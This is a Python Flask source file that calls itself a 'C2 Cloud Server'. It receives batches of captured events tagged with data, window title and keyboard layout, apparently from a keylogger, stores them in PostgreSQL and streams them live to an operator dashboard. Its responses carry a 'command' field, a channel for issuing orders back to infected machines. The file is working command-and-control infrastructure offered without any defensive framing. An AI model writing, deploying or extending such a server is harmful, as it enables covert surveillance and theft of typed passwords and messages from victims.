import os
import json
import psycopg2
from datetime import datetime
from flask import Flask, request, jsonify
from flask_socketio import SocketIO

app = Flask(__name__)
app.config['SECRET_KEY'] = 'cyber_override_secret'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

DATABASE_URL = os.environ.get("DATABASE_URL")

def init_db():
    if not DATABASE_URL:
        print("[-] ОШИБКА: DATABASE_URL не задан!")
        return
    try:
        conn = psycopg2.connect(DATABASE_URL)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS logs (
            id SERIAL PRIMARY KEY,
            event_id TEXT UNIQUE,
            timestamp TEXT,
            type TEXT,
            data TEXT,
            window TEXT,
            layout TEXT
        )''')
        conn.commit()
        c.close()
        conn.close()
        print("[+] База данных успешно инициализирована!")
    except Exception as e:
        print(f"[-] Ошибка подключения к БД: {e}")

init_db()

@app.route('/')
def index():
    return "C2 Cloud Server is running! Database is connected."

@app.route('/log', methods=['POST'])
def log():
    try:
        raw_data = request.get_data(as_text=True)
        data = json.loads(raw_data)
        
        event_id = data.get("event_id")
        timestamp = data.get("timestamp", datetime.now().isoformat())
        events = data.get("events", [])

        conn = psycopg2.connect(DATABASE_URL)
        c = conn.cursor()

        for ev in events:
            c.execute('''INSERT INTO logs (event_id, timestamp, type, data, window, layout) 
                         VALUES (%s, %s, %s, %s, %s, %s) 
                         ON CONFLICT (event_id) DO NOTHING''', 
                      (event_id, timestamp, ev.get("type"), ev.get("data"), 
                       ev.get("window"), ev.get("layout")))
            
            socketio.emit('new_log', {
                'time': datetime.now().strftime("%H:%M:%S"),
                'type': ev.get("type"),
                'data': ev.get("data"),
                'window': ev.get("window")
            })

        conn.commit()
        c.close()
        conn.close()

        return jsonify({"status": "ok", "command": "none", "server_time": datetime.now().isoformat()})
        
    except Exception as e:
        print(f"[-] Ошибка обработки пакета: {e}")
        return jsonify({"status": "error", "command": "none"}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
